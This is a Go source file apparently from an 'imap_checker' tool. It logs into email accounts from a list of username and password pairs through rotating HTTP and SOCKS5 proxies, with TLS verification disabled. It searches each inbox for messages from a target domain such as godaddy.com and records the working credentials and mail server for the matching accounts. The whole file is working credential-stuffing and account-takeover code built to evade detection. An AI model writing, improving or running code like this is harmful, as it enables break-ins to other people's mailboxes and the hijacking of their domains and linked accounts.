package searcher

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"net"
	"strconv"
	"strings"
	"time"

	"github.com/emersion/go-imap/v2"
	"github.com/emersion/go-imap/v2/imapclient"

	"imap_checker/internal/checker"
	"imap_checker/internal/db"
	"imap_checker/internal/progress"
	"imap_checker/internal/proxy"
)

const (
	dialTimeout   = 10 * time.Second
	tcpNet        = "tcp4"
	retryWait     = time.Second
	maxAttempts   = 2
	connectMaxHdr = 4096
)

var tlsCfg = &tls.Config{InsecureSkipVerify: true} //nolint:gosec

// Searcher performs IMAP SEARCH on verified accounts.
type Searcher struct {
	domainMap map[string]db.ServerInfo
	proxyPool *proxy.Pool
	writer    *Writer
	bar       *progress.Bar
	target    string // domain suffix, e.g. "godaddy.com"
}

// New creates a Searcher. domainMap must be read-only after construction.
func New(domainMap map[string]db.ServerInfo, pool *proxy.Pool, w *Writer, bar *progress.Bar, target string) *Searcher {
	return &Searcher{domainMap: domainMap, proxyPool: pool, writer: w, bar: bar, target: target}
}

// Search logs into cred's IMAP mailbox, searches INBOX FROM "@<target>",
// and writes the result to the Writer.
func (s *Searcher) Search(cred checker.Credential) {
	info := s.domainMap[cred.Domain]
	count, err := s.trySearch(cred, info)
	switch {
	case err != nil:
		s.writer.WriteError(cred.User, cred.Pass, err.Error())
		s.bar.IncError()
	case count > 0:
		s.writer.WriteFound(cred.User, cred.Pass, info.Host, info.Port, count)
		s.bar.IncValid()
	default:
		s.writer.WriteNotFound(cred.User, cred.Pass)
		s.bar.IncInvalid()
	}
}

func (s *Searcher) trySearch(cred checker.Credential, info db.ServerInfo) (int, error) {
	addr := fmt.Sprintf("%s:%d", info.Host, info.Port)
	var lastErr error
	for attempt := 0; attempt < maxAttempts; attempt++ {
		count, err := s.doSearch(cred, addr, info.Port)
		if err == nil {
			return count, nil
		}
		lastErr = err
		if attempt+1 < maxAttempts {
			time.Sleep(retryWait)
		}
	}
	return 0, lastErr
}

func (s *Searcher) doSearch(cred checker.Credential, addr string, port int) (int, error) {
	rawConn, err := s.dial(addr)
	if err != nil {
		return 0, err
	}
	_ = rawConn.SetDeadline(time.Now().Add(dialTimeout))

	var client *imapclient.Client
	if port == 143 {
		client, err = imapclient.NewStartTLS(rawConn, &imapclient.Options{TLSConfig: tlsCfg})
		if err != nil {
			_ = rawConn.Close()
			return 0, fmt.Errorf("starttls: %w", err)
		}
	} else {
		tlsConn := tls.Client(rawConn, tlsCfg)
		if err := tlsConn.Handshake(); err != nil {
			_ = rawConn.Close()
			return 0, fmt.Errorf("tls: %w", err)
		}
		client = imapclient.New(tlsConn, nil)
	}
	defer client.Close()

	if err := client.Login(cred.User, cred.Pass).Wait(); err != nil {
		var imapErr *imap.Error
		if errors.As(err, &imapErr) {
			return 0, fmt.Errorf("login: %w", err)
		}
		return 0, fmt.Errorf("login: %w", err)
	}

	if _, err := client.Select("INBOX", nil).Wait(); err != nil {
		return 0, fmt.Errorf("select: %w", err)
	}

	// If target already contains "@" treat it as a full address (e.g.
	// "donotreply@godaddy.com"); otherwise search by domain suffix.
	searchVal := s.target
	if !strings.Contains(s.target, "@") {
		searchVal = "@" + s.target
	}
	criteria := &imap.SearchCriteria{
		Header: []imap.SearchCriteriaHeaderField{
			{Key: "From", Value: searchVal},
		},
	}
	data, err := client.Search(criteria, nil).Wait()
	if err != nil {
		return 0, fmt.Errorf("search: %w", err)
	}
	return len(data.AllSeqNums()), nil
}

func (s *Searcher) dial(addr string) (net.Conn, error) {
	proxyEntry := s.proxyPool.Next()
	dialer := &net.Dialer{Timeout: dialTimeout}
	if proxyEntry == "" {
		return dialer.Dial(tcpNet, addr)
	}
	parts := strings.SplitN(proxyEntry, ":", 4)
	var proxyAddr, pUser, pPass string
	if len(parts) == 4 {
		proxyAddr, pUser, pPass = parts[0]+":"+parts[1], parts[2], parts[3]
	} else {
		proxyAddr = proxyEntry
	}
	conn, err := dialer.Dial(tcpNet, proxyAddr)
	if err != nil {
		s.proxyPool.MarkFailed(proxyEntry)
		return nil, fmt.Errorf("proxy dial: %w", err)
	}
	if err := conn.SetDeadline(time.Now().Add(dialTimeout)); err != nil {
		conn.Close()
		return nil, fmt.Errorf("proxy deadline: %w", err)
	}
	switch s.proxyPool.Kind() {
	case proxy.KindSOCKS5:
		if err := socks5Connect(conn, addr, pUser, pPass); err != nil {
			conn.Close()
			s.proxyPool.MarkFailed(proxyEntry)
			return nil, err
		}
	default:
		if err := httpConnect(conn, addr, pUser, pPass); err != nil {
			conn.Close()
			s.proxyPool.MarkFailed(proxyEntry)
			return nil, err
		}
	}
	return conn, nil
}

func httpConnect(conn net.Conn, addr, user, pass string) error {
	var authHdr string
	if user != "" || pass != "" {
		creds := base64.StdEncoding.EncodeToString([]byte(user + ":" + pass))
		authHdr = "Proxy-Authorization: Basic " + creds + "\r\n"
	}
	if _, err := fmt.Fprintf(conn, "CONNECT %s HTTP/1.0\r\nHost: %s\r\n%s\r\n", addr, addr, authHdr); err != nil {
		return fmt.Errorf("proxy CONNECT write: %w", err)
	}
	var hdr bytes.Buffer
	b := make([]byte, 1)
	for {
		if _, err := conn.Read(b); err != nil {
			return fmt.Errorf("proxy CONNECT read: %w", err)
		}
		hdr.Write(b)
		if bytes.HasSuffix(hdr.Bytes(), []byte("\r\n\r\n")) {
			break
		}
		if hdr.Len() > connectMaxHdr {
			return fmt.Errorf("proxy CONNECT response too large")
		}
	}
	statusLine := hdr.Bytes()
	if idx := bytes.Index(statusLine, []byte("\r\n")); idx >= 0 {
		statusLine = statusLine[:idx]
	}
	parts := bytes.SplitN(statusLine, []byte(" "), 3)
	if len(parts) < 2 || len(parts[1]) != 3 || parts[1][0] != '2' {
		return fmt.Errorf("proxy CONNECT failed: %s", string(statusLine))
	}
	return nil
}

func socks5Connect(conn net.Conn, addr, user, pass string) error {
	host, portStr, err := net.SplitHostPort(addr)
	if err != nil {
		return fmt.Errorf("socks5 split: %w", err)
	}
	port, err := strconv.Atoi(portStr)
	if err != nil || port < 0 || port > 0xFFFF {
		return fmt.Errorf("socks5 bad port %q", portStr)
	}
	if len(host) > 255 {
		return fmt.Errorf("socks5 host too long")
	}
	greet := []byte{0x05, 0x01, 0x00}
	if user != "" || pass != "" {
		greet = []byte{0x05, 0x02, 0x02, 0x00}
	}
	if _, err := conn.Write(greet); err != nil {
		return fmt.Errorf("socks5 greet: %w", err)
	}
	resp := make([]byte, 2)
	if _, err := io.ReadFull(conn, resp); err != nil {
		return fmt.Errorf("socks5 greet resp: %w", err)
	}
	if resp[0] != 0x05 {
		return fmt.Errorf("socks5 bad version %#x", resp[0])
	}
	switch resp[1] {
	case 0x00:
	case 0x02:
		req := make([]byte, 0, 3+len(user)+len(pass))
		req = append(req, 0x01, byte(len(user)))
		req = append(req, user...)
		req = append(req, byte(len(pass)))
		req = append(req, pass...)
		if _, err := conn.Write(req); err != nil {
			return fmt.Errorf("socks5 auth: %w", err)
		}
		ar := make([]byte, 2)
		if _, err := io.ReadFull(conn, ar); err != nil {
			return fmt.Errorf("socks5 auth resp: %w", err)
		}
		if ar[1] != 0x00 {
			return fmt.Errorf("socks5 auth rejected %#x", ar[1])
		}
	default:
		return fmt.Errorf("socks5 unsupported method %#x", resp[1])
	}
	req := make([]byte, 0, 7+len(host))
	req = append(req, 0x05, 0x01, 0x00, 0x03, byte(len(host)))
	req = append(req, host...)
	req = append(req, byte(port>>8), byte(port&0xFF))
	if _, err := conn.Write(req); err != nil {
		return fmt.Errorf("socks5 connect: %w", err)
	}
	head := make([]byte, 4)
	if _, err := io.ReadFull(conn, head); err != nil {
		return fmt.Errorf("socks5 reply: %w", err)
	}
	if head[1] != 0x00 {
		return fmt.Errorf("socks5 reply status %#x", head[1])
	}
	var addrLen int
	switch head[3] {
	case 0x01:
		addrLen = 4
	case 0x03:
		l := make([]byte, 1)
		if _, err := io.ReadFull(conn, l); err != nil {
			return fmt.Errorf("socks5 addr len: %w", err)
		}
		addrLen = int(l[0])
	case 0x04:
		addrLen = 16
	default:
		return fmt.Errorf("socks5 unknown atyp %#x", head[3])
	}
	if _, err := io.CopyN(io.Discard, conn, int64(addrLen+2)); err != nil {
		return fmt.Errorf("socks5 drain: %w", err)
	}
	return nil
}
